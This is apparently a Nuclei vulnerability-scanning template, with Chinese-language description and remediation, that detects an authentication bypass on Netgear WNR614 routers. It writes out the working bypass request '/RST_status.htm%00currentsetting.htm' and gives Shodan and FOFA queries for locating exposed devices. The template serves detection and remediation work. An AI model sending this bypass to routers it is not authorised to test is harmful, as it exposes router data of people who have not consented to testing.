id: netgear-wnr614-auth-bypass

info:
  name: Netgear WNR614 - Improper Authentication
  author: ritikchaddha
  severity: high
  description: |
    该模板用于检测 Netgear WNR614 - Improper Authentication。该类漏洞通常源于认证、授权或会话校验逻辑不完整，使未授权用户可访问受保护接口或执行敏感操作。模板会向 `/RST_status.htm%00currentsetting.htm` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可绕过登录或权限限制，访问管理功能、敏感数据或业务操作接口。
    - 在管理接口暴露的场景下，可能进一步导致配置被篡改、账号被接管或系统被植入后门。
  remediation: |
    - 在服务端统一执行认证和授权校验，避免仅依赖前端控制或可预测参数。
    - 修复存在绕过问题的版本，并限制管理接口、调试接口和敏感 API 的访问来源。
    - 审计异常登录、权限变更和配置修改记录，轮换可能受影响的账号凭据。
  reference:
    - https://github.com/Shuanunio/CVE_Requests/blob/main/Netgear/WNR614/assets/image-20241210153405727.png
    - https://github.com/Shuanunio/CVE_Requests/blob/main/Netgear/WNR614/ACL%20bypass%20Vulnerability%20in%20Netgear%20WNR614.md
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-200
  metadata:
    verified: true
    max-request: 1
    vendor: Netgear
    product: WNR614
    shodan-query: http.title:"WNR614"
    fofa-query: title="NETGEAR WNR614"
  tags: cve,cve2024,netgear,router,exposure,wnr614,unauth,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/RST_status.htm%00currentsetting.htm"

    matchers:
      - type: dsl
        dsl:
          - 'contains_all(body, "Router Information", "Show Statistics", "Internet Port")'
          - 'status_code == 200'
        condition: and
